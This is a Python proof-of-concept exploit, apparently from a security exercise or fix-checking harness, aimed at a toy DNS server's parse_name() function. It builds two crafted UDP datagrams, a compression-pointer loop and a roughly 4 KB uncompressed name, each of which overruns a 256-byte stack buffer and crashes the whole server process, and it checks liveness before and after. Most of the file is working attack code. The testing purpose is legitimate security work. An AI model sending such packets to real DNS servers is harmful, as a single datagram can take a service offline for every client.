#!/usr/bin/env python3
"""
PoC #1: DNS name-decompression pointer loop -> one-shot process crash
-----------------------------------------------------------------------------
Bug: parse_name() in dnsm.c expands compressed names into the caller's
fixed-size stack buffer (`char qname[256]` in process_query()) with NO bounds
check on the write position (outpos), NO bounds check on the read position
against the message length, and NO loop/visited guard when it follows
11xxxxxx compression pointers.

A pure self-referential pointer (QNAME = 0xC0 0x0C, i.e. a pointer to offset
12, where the pointer itself lives) merely makes parse_name() re-read the same
pointer forever - a tight busy loop that never writes to `out`, so it only
spins one thread and does not reliably degrade anything.

This PoC instead stitches a *label* in front of the back-pointer:

    QNAME = <len=63> <63 bytes> <0xC0 0x0C>

parse_name() reads the 63-byte label and copies 64 bytes into qname[], then
hits the pointer and jumps back to offset 12 - the same label - and copies 64
more, forever, with NO bound on outpos. Within microseconds it runs off the
end of qname[256], marches up through the worker thread's stack, and hits an
unmapped page -> SIGSEGV. That signal takes down the whole process, not just
the one thread, so a SINGLE datagram is a full-service outage. The binary is
built -fno-stack-protector -no-pie (see Makefile), so there is no canary to
turn this into a controlled abort; it is a raw stack overrun crash.

How this proves it, purely over the wire:
  1. Confirm the server is alive (an ordinary query gets an answer).
  2. Send ONE crafted label+back-pointer datagram (fire-and-forget - it will
     never get a reply, the handler dies mid-parse).
  3. Confirm the server is now dead: repeated ordinary queries all time out.
A live-before / dead-after transition off a single packet proves the crash.

Two root causes, two probes (don't let a HALF fix score as a full one):
parse_name() needs BOTH a loop/visited guard (to stop the pointer loop) AND a
write bound on `outpos` (to stop the buffer overrun). A team that adds only a
loop guard - a "strictly-backward pointer" rule or a visited-set - stops the
self-referential loop in probe A but leaves the write unbounded, so an
over-long name still overruns qname[256]. Probe B therefore sends a long name
that uses NO compression at all (a flat run of maximal labels, ~4 KB), which
sails straight past any pointer-loop guard and overflows purely on the missing
write bound. If probe A does not crash the server, we fire probe B; only if
BOTH leave the server alive is the bug actually fixed (write bound present).

Run the server first, then:
    python3 01_compression_pointer_loop.py [host] [port]
"""
import socket
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8053


def dns_name(n):
    return b"".join(bytes([len(l)]) + l.encode() for l in n.split(".") if l) + b"\x00"


def normal_query(name="www.example.com", txid=0x1111):
    return struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0) + dns_name(name) + struct.pack(">HH", 1, 1)


def crash_pointer_loop_query(txid=0x6666):
    # header (12 bytes), then QNAME = a 63-byte label followed by a compression
    # pointer to offset 12 (the label itself). parse_name() copies the label,
    # follows the pointer back to it, copies it again, ... forever, overflowing
    # the caller's qname[256] stack buffer with no bound -> SIGSEGV.
    header = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    qname = bytes([63]) + b"a" * 63 + b"\xc0\x0c"   # 0xC0 0x0C -> offset 12
    return header + qname + struct.pack(">HH", 1, 1)


def crash_long_inline_query(txid=0x7777):
    # Probe B (write-bound): a long name with NO compression pointer - just a
    # flat run of ~64 maximal (63-byte) labels, terminated normally. parse_name
    # copies ~4 KB into qname[256] in a single straight-line pass, so a loop/
    # visited guard never even runs. Only a write bound on outpos stops this;
    # without one the stack buffer overruns and the process dies, exactly like
    # probe A - proving a loop-guard-only fix is incomplete.
    header = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    qname = (bytes([63]) + b"a" * 63) * 64 + b"\x00"
    return header + qname + struct.pack(">HH", 1, 1)


def query_ok(msg, timeout):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(msg, (HOST, PORT))
        s.recvfrom(8192)
        return True
    except (socket.timeout, OSError):
        return False
    finally:
        s.close()


def server_alive(timeout=2.0, tries=3):
    # A UDP server can silently drop the odd packet; require just one clean
    # reply out of a few tries to call it "alive".
    for i in range(tries):
        if query_ok(normal_query(txid=0x4000 + i), timeout=timeout):
            return True
    return False


def main():
    if not server_alive():
        print("[-] server did not answer baseline queries; cannot run PoC")
        return 1
    print("[*] server is alive (answered a baseline query)")

    print("[*] probe A: ONE label+back-pointer datagram (compression-pointer "
          "loop overruns qname[256] in parse_name -> stack overrun -> SIGSEGV)...")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.sendto(crash_pointer_loop_query(), (HOST, PORT))
    finally:
        s.close()

    time.sleep(0.5)   # let the crash propagate and the process tear down

    if not server_alive(timeout=2.0, tries=4):
        print("[+] crash confirmed (probe A): a SINGLE self-referential compression-pointer "
              "datagram overflowed qname[256] in parse_name() and killed the whole "
              "process - the server that answered moments ago is now dead to every "
              "client. One packet, full-service outage.")
        return 0

    print("[*] probe A did not crash the server (a loop/visited guard may be present). "
          "Firing probe B: a ~4 KB flat (uncompressed) name that overruns qname[256] on "
          "the missing WRITE BOUND alone, with no pointer loop for a guard to catch...")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.sendto(crash_long_inline_query(), (HOST, PORT))
    finally:
        s.close()

    time.sleep(0.5)

    if server_alive(timeout=2.0, tries=4):
        print("[-] server is still answering after BOTH probes; the bug is fixed "
              "(parse_name bounds every write AND guards pointer loops) or the process "
              "was auto-restarted by a supervisor")
        return 1

    print("[+] crash confirmed (probe B): a long UNCOMPRESSED name overran qname[256] in "
          "parse_name() - a loop/visited guard alone did not save it, the WRITE BOUND is "
          "still missing. Incomplete fix: one packet is still a full-service outage.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
